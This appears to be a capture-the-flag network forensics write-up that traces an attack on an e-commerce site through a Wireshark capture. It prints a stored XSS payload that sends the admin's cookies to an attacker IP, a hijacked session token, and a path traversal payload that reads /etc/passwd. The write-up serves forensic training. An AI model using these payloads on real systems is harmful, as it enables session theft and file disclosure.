# 🕵️‍♂️ CyberDefenders: RetailBreach — Web Application & Network Forensics Write-up (Wireshark)

[![Platform](https://img.shields.io/badge/Platform-CyberDefenders-blue)](https://cyberdefenders.org/)
[![Category](https://img.shields.io/badge/Category-Network%20Forensics-informational)](#)
[![Attack Vectors](https://img.shields.io/badge/Vectors-Gobuster%20%7C%20Stored%20XSS%20%7C%20Session%20Hijacking%20%7C%20LFI-critical)](#)
[![Tool](https://img.shields.io/badge/Tool-Wireshark%20%26%20CyberChef-1679A7)](#)

## 📌 Lab Overview
This write-up documents the network forensics investigation of the **RetailBreach** challenge on CyberDefenders. By analyzing the captured network traffic (`RetailBreach.pcap`) in **Wireshark**, we reconstruct a multi-stage web application attack against the **ShopSphere** e-commerce platform (`shopsphere.com` / `73.124.17.52`)—tracing the intrusion from initial directory brute-forcing with **Gobuster**, through a **Stored Cross-Site Scripting (XSS)** attack that hijacked an administrator's `PHPSESSID` session token, to **Local File Inclusion (LFI) / Path Traversal** in an administrative log viewer script.

---

### Q1: Identifying an attacker's IP address is crucial for mapping the attack's extent and planning an effective response. What is the attacker's IP address?
To identify suspicious enumeration against authentication endpoints on the web server (`73.124.17.52`), we start by filtering for HTTP packets containing the string `"login"`:

    http contains "login"

While legitimate administrative login traffic originates from `135.143.142.5`, starting at packet `198` (`2024-03-29 12:01:38` UTC) we observe a high-volume burst of automated HTTP `GET` requests probing non-existent login paths (`/login.php`, `/admin_login`, `/adminlogin`, `/autologin`, `/customer_login`, `/dir-login`, etc.), all originating from a single external IPv4 address:

<img width="1854" height="963" alt="obraz" src="https://github.com/user-attachments/assets/4c86f83b-8ea3-4e18-bc17-6924e4e4c141" />


* **Answer:** `111.224.180.128`

---

### Q2: The attacker used a directory brute-forcing tool to discover hidden paths. Which tool did the attacker use to perform the brute-forcing?
To identify the specific scanner or directory enumeration utility used by `111.224.180.128`, we filter for HTTP traffic (`http`) and inspect one of the brute-force TCP streams (e.g., `tcp.stream eq 421`) via **Follow -> TCP Stream**.

Examining the HTTP request headers sent to `shopsphere.com` (which trigger `HTTP/1.1 404 Not Found` responses from `Apache/2.4.52 (Ubuntu)`) reveals the tool's signature directly inside the `User-Agent` header (`User-Agent: gobuster/3.6`):

<img width="1854" height="963" alt="obraz" src="https://github.com/user-attachments/assets/5c139617-44ea-4970-ad43-b1406cfb4f2a" />

<img width="1854" height="963" alt="obraz" src="https://github.com/user-attachments/assets/68567055-6df7-4ac2-b209-1e915475d4d7" />


* **Answer:** `gobuster`

---

### Q3: Cross-Site Scripting (XSS) allows attackers to inject malicious scripts into web pages viewed by users. Can you specify the XSS payload that the attacker used to compromise the integrity of the web application?
To locate the Cross-Site Scripting (XSS) injection, we inspect HTTP `POST` requests sent by the attacker (`111.224.180.128`) and follow HTTP stream `96` (`tcp.stream eq 96`, packet `10058`). Here, the attacker submits a malicious review to `POST /reviews.php` containing a URL-encoded JavaScript payload inside the `review` form parameter:

    review=%3Cscript%3Efetch%28%27http%3A%2F%2F111.224.180.128%2F%27+%2B+document.cookie%29%3B%3C%2Fscript%3E

<img width="1854" height="963" alt="obraz" src="https://github.com/user-attachments/assets/18398a21-8b45-4cdc-9727-5b36cc1a5c64" />


Decoding the URL-encoded string in **CyberChef** (using the **URL Decode** recipe with *Treat '+' as space* enabled) or inspecting the rendered HTML in the server's `HTTP/1.1 200 OK` response reveals the exact **Stored XSS** payload designed to exfiltrate the victim's `document.cookie` to the attacker's host (`http://111.224.180.128/`):

    <script>fetch('http://111.224.180.128/' + document.cookie);</script>

<img width="1854" height="963" alt="obraz" src="https://github.com/user-attachments/assets/3cd1817e-fbc6-4d7b-a10c-a8402ed80e22" />

<img width="1854" height="963" alt="obraz" src="https://github.com/user-attachments/assets/1967b973-6341-486c-a218-017c5778e128" />


* **Answer:** `<script>fetch('http://111.224.180.128/' + document.cookie);</script>`

---

### Q4: Pinpointing the exact moment an admin user encounters the injected malicious script is crucial for understanding the timeline of a security breach. Can you provide the UTC timestamp when the admin user first visited the page containing the injected malicious script?
From our initial analysis, we know the administrator's IP address is `135.143.142.5` (seen accessing `/admin/dashboard.php`), and the Stored XSS payload was injected into `/reviews.php` at `12:08:47` UTC. To find when the administrator subsequently loaded the compromised page, we filter for `GET` requests targeting `reviews.php`:

    http.request.method == "GET" and http contains "reviews.php"

Looking at packet `10106`—the first `GET /reviews.php` request from `135.143.142.5` after the attacker's `POST` injection—we see the exact UTC timestamp (`2024-03-29 12:09:30`):

<img width="1854" height="963" alt="obraz" src="https://github.com/user-attachments/assets/2adba366-cc18-48a4-b3ac-714eb80fc25c" />


* **Answer:** `2024-03-29 12:09`

---

### Q5: The theft of a session token through XSS is a serious security breach that allows unauthorized access. Can you provide the session token that the attacker acquired and used for this unauthorized access?
When the administrator (`135.143.142.5`) visited `/reviews.php` in packet `10106` (`tcp.stream eq 100`), the server returned the HTML page containing the `<script>fetch('http://111.224.180.128/' + document.cookie);</script>` payload (and an active `<a href="admin/dashboard.php">Admin Panel</a>` link confirming administrative privileges).

Inspecting the administrator's session cookie (`PHPSESSID`) exfiltrated to the attacker and subsequently reused by `111.224.180.128` in `Cookie: PHPSESSID=...` headers reveals the hijacked session token:

<img width="1854" height="963" alt="obraz" src="https://github.com/user-attachments/assets/9ce19852-5c29-4e86-b704-f6a6c35bfcdd" />

<img width="1854" height="963" alt="obraz" src="https://github.com/user-attachments/assets/ffc46496-ce19-4352-866d-2fc846c5fc37" />


* **Answer:** `lqkctf24s9h9lg67teu8uevn3q`

---

### Q6: Identifying which scripts have been exploited is crucial for mitigating vulnerabilities in a web application. What is the name of the script that was exploited by the attacker?
Following the attacker's HTTP traffic after hijacking the administrator's `PHPSESSID` cookie (`tcp.stream eq 111`, packet `10219`), we observe `111.224.180.128` accessing an administrative utility at `/admin/log_viewer.php` and exploiting its `file` query parameter:

    GET /admin/log_viewer.php?file=../../../../../etc/passwd HTTP/1.1

<img width="1854" height="963" alt="obraz" src="https://github.com/user-attachments/assets/d48b4ef3-21e0-4aca-b79e-f17e09311951" />


* **Answer:** `log_viewer.php`

---

### Q7: Exploiting vulnerabilities to access sensitive system files is a common tactic used by attackers. Can you identify the specific payload the attacker used to access a sensitive system file?
To isolate directory traversal attempts across the capture, we can apply the filter:

    http contains "../"

In packet `10219` (`tcp.stream eq 111`), the attacker passes a **Path Traversal / Local File Inclusion (LFI)** payload into the `file=` parameter of `/admin/log_viewer.php`, traversing five directories up to read the system's `/etc/passwd` file (which is returned in full inside the HTTP `200 OK` response body):

<img width="1854" height="963" alt="obraz" src="https://github.com/user-attachments/assets/fcfbb3bd-d5ad-446b-af64-28089a84c84f" />


* **Answer:** `../../../../../etc/passwd`
